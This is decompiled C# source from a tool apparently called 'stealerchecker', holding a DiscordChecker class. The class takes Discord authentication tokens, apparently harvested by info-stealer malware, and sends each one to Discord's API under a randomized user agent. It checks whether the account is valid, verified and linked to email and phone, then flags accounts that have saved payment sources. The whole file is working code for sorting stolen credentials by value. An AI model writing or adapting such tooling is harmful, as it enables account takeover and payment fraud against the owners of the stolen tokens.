// Decompiled with JetBrains decompiler
// Type: stealerchecker.DiscordChecker
// Assembly: stealerchecker, Version=9.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EACD1CA4-3D73-4169-BD60-7A660205DCFD
// Assembly location: C:\Users\fox89\Desktop\StealerChecker\stealerchecker.exe

using Leaf.xNet;
using Newtonsoft.Json;
using stealerchecker.Models;

namespace stealerchecker
{
  public static class DiscordChecker
  {
    private const string DefaultCheck = "https://discord.com/api/v9/users/@me";
    private const string DefaultPayment = "https://discord.com/api/v9/users/@me/billing/payment-sources";
    private static readonly HttpRequest req = new HttpRequest()
    {
      UserAgent = Http.RandomUserAgent(),
      IgnoreProtocolErrors = true
    };

    public static CheckResult CheckToken(string token)
    {
      CheckResult checkResult = new CheckResult(false, token);
      try
      {
        DiscordChecker.req.ClearAllHeaders();
        DiscordChecker.req.AddHeader("Authorization", token);
        HttpResponse httpResponse1 = DiscordChecker.req.Get("https://discord.com/api/v9/users/@me");
        if (!httpResponse1.IsOK)
          return checkResult;
        ResponseModel responseModel = JsonConvert.DeserializeObject<ResponseModel>(httpResponse1.ToString());
        checkResult.IsValid = responseModel.Email != null && responseModel.Phone != null && responseModel.Verified;
        if (!checkResult.IsValid)
          return checkResult;
        DiscordChecker.req.ClearAllHeaders();
        DiscordChecker.req.AddHeader("Authorization", token);
        DiscordChecker.req.UserAgent = Http.RandomUserAgent();
        DiscordChecker.req.IgnoreProtocolErrors = true;
        HttpResponse httpResponse2 = DiscordChecker.req.Get("https://discord.com/api/v9/users/@me/billing/payment-sources");
        if (httpResponse2.IsOK)
        {
          if (!httpResponse2.ToString().Equals("[]"))
            checkResult.Payment = true;
        }
      }
      catch
      {
        return checkResult;
      }
      return checkResult;
    }
  }
}
